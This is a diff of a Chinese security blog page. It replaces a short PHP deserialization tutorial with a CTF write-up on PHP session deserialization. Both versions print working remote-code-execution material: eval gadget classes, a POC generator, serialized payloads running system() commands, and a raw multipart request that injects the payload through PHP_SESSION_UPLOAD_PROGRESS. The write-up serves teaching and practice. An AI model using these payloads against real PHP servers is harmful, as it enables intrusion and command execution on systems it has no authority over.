@@ -4,9 +4,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PHP反序列化漏洞 - Reber's Blog</title>
+    <title>关于 PHP SESSION 反序列化 - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
-    <meta name="description" content="">
+    <meta name="description" content="基于第三届4.29“安恒杯”网络安全技术大赛初赛中的题，第三个web题，php反序列化漏洞">
     <meta name="author" content="reber">
     <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
     <!--[if lte IE 8]>
@@ -61,14 +61,14 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>PHP反序列化漏洞</h2>
+                <h2>关于 PHP SESSION 反序列化</h2>
                 
                 <div class="post-meta">
                     <div style="padding:5px 5px 2px 5px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>
                             
-                                2016-07-25
+                                2018-07-23
                             
                         </time>
                         &nbsp;&nbsp;&nbsp;&nbsp;
@@ -92,7 +92,9 @@
                         
                             <i class="fa fa-tags fa-fw"></i>
                             
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/php">php</a>&nbsp;&#47;
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/deserialize">deserialize</a>
                             
                         
                         
@@ -104,62 +106,298 @@
                 
                 
 
-<h3 id="0x00-关于反序列化漏洞">0x00 关于反序列化漏洞</h3>
+<!--
+ * @Author: reber
+ * @Mail: reber0ask@qq.com
+ * @Date: 2019-04-10 10:45:01
+ * @LastEditTime: 2019-07-25 12:40:37
+ -->
 
-<p>序列化：使用函数serialize()可将实例序列化为字符串<br />
-反序列化：使用函数unserialize()可将序列化的字符串还原</p>
+<h3 id="0x00-环境">0x00 环境</h3>
+
+<p>公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。</p>
+
+<p>其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题</p>
+
+<p>我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。</p>
+
+<pre><code class="language-ini">reber@wyb:~$ html cat /proc/version
+Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016
+
+reber@wyb:~$ html php --version
+PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb  9 2017 20:54:58)
+Copyright (c) 1997-2014 The PHP Group
+Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
+    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
+
+reber@ubuntu-linux:~$ apachectl -v
+Server version: Apache/2.4.7 (Ubuntu)
+Server built:   Jul 15 2016 15:34:04
+</code></pre>
+
+<pre><code>#php.ini部分相关配置
+session.auto_start=Off
+session.serialize_handler=php_serialize
+session.upload_progress.cleanup=Off
+session.upload_progress.enabled=On
+</code></pre>
+
+<h3 id="0x01-php-session-序列化及反序列化处理器">0x01 PHP Session 序列化及反序列化处理器</h3>
+
+<p>php在session存储和读取时,都会有一个序列化和反序列化的过程，反序列化中会调用对象的magic方法,比如<code>__destruct(),__wakeup()</code>等</p>
+
+<p>PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下：</p>
+
+<pre><code>---------------------------------------------------------------------------------------------
+处理器                      |对应的存储格式
+---------------------------------------------------------------------------------------------
+php                        |键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
+php_binary                 |键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
+php_serialize (php&gt;=5.5.4) |经过 serialize() 函数反序列处理的数组
+---------------------------------------------------------------------------------------------
+</code></pre>
+
+<p>一般来说当你访问一个网站时若浏览器Cookie中生成 PHPSESSID=02jhnntphc2sg87i03kvv99425;，则服务器会生成名字类似于sess_02jhnntphc2sg87i03kvv99425的对应session文件，里面存的就是session信息</p>
+
+<p>比如<code>http://10.11.11.11/test.php</code>有如下代码：</p>
+
+<pre><code>&lt;?php
+    session_start();
+    $name = $_GET['name'];
+    $passwd = $_GET['passwd'];
+    $_SESSION['name'] = $name;
+    $_SESSION['passwd'] = $passwd;
+?&gt;
+</code></pre>
+
+<p>当你访问<code>10.11.11.11/test.php?name=xiaoming&amp;passwd=123456</code>时，使用不同处理器时session文件就会存入相应格式的序列化字符串：</p>
+
+<pre><code class="language-diff">---------------------------------------------------------------------------------------
+处理器                      |对应存储的序列化字符串
+---------------------------------------------------------------------------------------
+php                        |name|s:8:&quot;xiaoming&quot;;passwd|s:6:&quot;123456&quot;;
+php_binary                 |names:8:&quot;xiaoming&quot;;passwds:6:&quot;123456&quot;;
+php_serialize (php&gt;=5.5.4) |a:2:{s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;}
+---------------------------------------------------------------------------------------
+</code></pre>
+
+<p>如果 PHP 在反序列化存储的 SESSION 数据时使用的处理器和序列化时使用的处理器不同，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码</p>
+
+<h3 id="0x02-相关文件">0x02 相关文件</h3>
+
+<p>一共有三个文件：</p>
 
 <ul>
-<li>服务端有test.php，代码如下</li>
+<li>class.php</li>
 </ul>
 
-<pre><code class="language-php">&lt;?php
-    class fun{
-        public $msg;
-        function __construct(){
-            echo '__construct';
-        }
-        function __destruct() {
-            eval($this-&gt;msg);
-        }
-    }
+<pre><code>&lt;?php
 
-    $d = $_REQUEST['str'];
-    var_dump($d);
-    echo &quot;&lt;br /&gt;&quot;;
-    $tc = unserialize($d);
-    var_dump($tc);
+highlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));
+//show_source(__FILE__);
+
+class foo1{
+    public $varr;
+    function __construct(){
+        $this-&gt;varr = &quot;index.php&quot;;
+    }
+    function __destruct(){
+        if(file_exists($this-&gt;varr)){
+            echo &quot;&lt;br&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br&gt;&quot;;
+        }
+        echo &quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;;
+    }
+}
+
+class foo2{
+    public $varr;
+    public $obj;
+    function __construct(){
+        $this-&gt;varr = '1234567890';
+        $this-&gt;obj = null;
+    }
+    function __toString(){
+        $this-&gt;obj-&gt;execute();
+        return $this-&gt;varr;
+    }
+    function __desctuct(){
+        echo &quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;;
+    }
+}
+
+class foo3{
+    public $varr;
+    function execute(){
+        eval($this-&gt;varr);
+    }
+    function __desctuct(){
+        echo &quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;;
+    }
+}
+
 ?&gt;
 </code></pre>
 
 <ul>
-<li>客户端可构造如下代码生成序列化后的字符串</li>
+<li>index.php</li>
 </ul>
 
-<pre><code class="language-php">&lt;?php
-    class fun{
-        public $msg;
-        function __construct(){
-            echo '__construct';
-        }
-        function __destruct() {
-            eval($this-&gt;msg);
-        }
-    }
+<pre><code>&lt;?php
+    ini_set('session.serialize_handler', 'php');
+    //服务器反序列化使用的处理器是php_serialize，而这里使用了php，所以会出现安全问题
+    require(&quot;./class.php&quot;);
+    session_start();
 
-    $f = new fun();
-    $f-&gt;msg = &quot;system('ls /etc/ssh');&quot;;
-    echo serialize($f);
+    $obj = new foo1();
+    $obj-&gt;varr = &quot;phpinfo.php&quot;;
 ?&gt;
 </code></pre>
 
-<p>生成的序列化字符串为：<code>O:3:&quot;fun&quot;:1:{s:3:&quot;msg&quot;;s:22:&quot;system('ls /etc/ssh');&quot;;}</code></p>
-
 <ul>
-<li>提交序列化字符串给服务端从而执行命令</li>
+<li>phpinfo.php</li>
 </ul>
 
-<p>访问<code>http://127.0.0.1/test.php?str=O:3:&quot;fun&quot;:1:{s:3:&quot;msg&quot;;s:22:&quot;system('ls /etc/ssh');&quot;;}</code>即可得到/etc/ssh下的文件</p>
+<pre><code>&lt;?php
+    session_start();
+    require(&quot;./class.php&quot;);
+
+    $f3 = new foo3();
+    $f3-&gt;varr = &quot;phpinfo();&quot;;
+    $f3-&gt;execute();
+?&gt;
+</code></pre>
+
+<h3 id="0x03-解题思路">0x03 解题思路</h3>
+
+<p>先说下session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。</p>
+
+<p>当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。</p>
+
+<p>当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。</p>
+
+<p><br></p>
+
+<p>假如说正常服务器php使用的是php_serialize处理器时，若post：name=xiaoming&amp;passwd=123456|aaaaaaaaa，</p>
+
+<p>则session中存的就是<code>a:2:{s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:6:&quot;passwd&quot;;s:16:&quot;123456|aaaaaaaaa&quot;;}</code>，若还用php_serialize读取数据的话还能读取到正常数据</p>
+
+<p>但若以php处理器读取时得到的就是键为<code>a:2:{s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:6:&quot;passwd&quot;;s:16:&quot;123456</code>，</p>
+
+<p>值为<code>|</code>后面的序列化字符串反序列化后的数据(因为php处理器存储的格式是：键名|反序列后的值)</p>
+
+<p><br></p>
+
+<p>当前代码的话没有向服务器提交数据，但是现在session.upload_progress.enabled是开启的，所以可以通过上传文件，从而在session文件中写入数据</p>
+
+<p><br></p>
+
+<ul>
+<li>POC</li>
+</ul>
+
+<pre><code>&lt;?php
+class foo3{
+    public $varr;
+    function __construct(){
+        $this-&gt;varr = 'system(\'ls /var/www/html\');';
+    }
+}
+ 
+class foo2{
+    public $varr;
+    public $obj;
+    function __construct(){
+        $this-&gt;varr = '1';
+        $this-&gt;obj = new foo3();
+    }
+}
+ 
+class foo1{
+    public $varr;
+    function __construct(){
+        $this-&gt;varr = new foo2();
+    }
+}
+ 
+echo serialize(new foo1());
+?&gt;
+</code></pre>
+
+<ul>
+<li>上传表单</li>
+</ul>
+
+<p>这里的action只要是服务器上代码中有session_start()的php文件即可</p>
+
+<pre><code>&lt;form action=&quot;http://192.168.3.136/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;        
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;        
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;        
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+
+<h3 id="0x04-利用">0x04 利用</h3>
+
+<ul>
+<li>首先利用poc生成序列化的payload</li>
+</ul>
+
+<pre><code>O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:27:&quot;system('ls /var/www/html');&quot;;}}}
+</code></pre>
+
+<ul>
+<li>通过上面的表单上传文件时抓包改包如下</li>
+</ul>
+
+<pre><code>POST /phpinfo.php HTTP/1.1
+Host: 10.11.11.11
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Referer: http://127.0.0.1/upload.html
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------1971979777391321181548092978
+Content-Length: 489
+
+-----------------------------1971979777391321181548092978
+Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
+
+123|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:27:&quot;system('ls /var/www/html');&quot;;}}} 
+-----------------------------1971979777391321181548092978
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;tmp.txt&quot;
+Content-Type: text/plain
+
+abcdefg
+-----------------------------1971979777391321181548092978--
+</code></pre>
+
+<p><img src="/img/post/php-session-unserialize-1.png" alt="" /></p>
+
+<p>请求后服务器上生成的session文件sess_6oa2pegcmlejjvhr4t68ric5l5的内容为：</p>
+
+<pre><code>a:1:{s:152:&quot;upload_progress_123|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:27:&quot;system('ls /var/www/html');&quot;;}}}
+</code></pre>
+
+<ul>
+<li>改包重新访问从而执行代码</li>
+</ul>
+
+<p><img src="/img/post/php-session-unserialize-2.png" alt="" /></p>
+
+<ul>
+<li>然后更改poc中的payload生成新的序列化字符串，重复上述操作即可得到flag</li>
+</ul>
+
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<ul>
+<li><a href="http://drops.wooyun.org/tips/3909?_blank">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></li>
+<li><a href="https://www.tuicool.com/articles/BfuayyI?_blank">安恒429|web 3 session反序列化</a></li>
+<li><a href="http://www.mottoin.com/18436.html?_blank">有趣的php反序列化总结</a></li>
+</ul>
 
                 
                 <div style="padding:10px 1px;">
@@ -176,8 +414,8 @@
     <div class="pure-u-12-24" style="text-align: left;">
         
         <nav class="prev">
-            <a href="http://wyb0.com/posts/2016/code-execution-vulnerabilities/">
-                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;代码执行漏洞(一)
+            <a href="http://wyb0.com/posts/2018/structs2-some-vulnerability-payload/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;Struts 2相关漏洞payload
             </a>
         </nav>
         
@@ -185,8 +423,8 @@
     <div class="pure-u-12-24" style="text-align: right;">
         
         <nav class="next">
-            <a href="http://wyb0.com/posts/2016/file-include-vulnerabilities/">
-                文件包含漏洞&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
+            <a href="http://wyb0.com/posts/2018/injection-tips-of-sqlserver/">
+                SQL注入tips(SQL Server)&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
             </a>
         </nav>
         
@@ -272,6 +510,11 @@
             </p>
         
             <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/cgi" title="cgi">cgi</a>
                 <sup>1</sup>
             </p>
@@ -297,6 +540,11 @@
             </p>
         
             <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/dmz" title="dmz">dmz</a>
                 <sup>1</sup>
             </p>
@@ -304,6 +552,11 @@
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
                 <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
+                <sup>3</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -402,6 +655,11 @@
             </p>
         
             <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/rce" title="rce">rce</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/redis" title="redis">redis</a>
                 <sup>2</sup>
             </p>
@@ -462,32 +720,12 @@
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
-                <sup>5</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
                 <sup>2</sup>
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" title="反序列化">反序列化</a>
-                <sup>2</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e5%90%8e%e9%97%a8" title="后门">后门</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
                 <sup>1</sup>
             </p>
         
@@ -499,11 +737,6 @@
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
                 <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" title="文件上传">文件上传</a>
-                <sup>3</sup>
             </p>
         
             <p style="display:inline-block;">
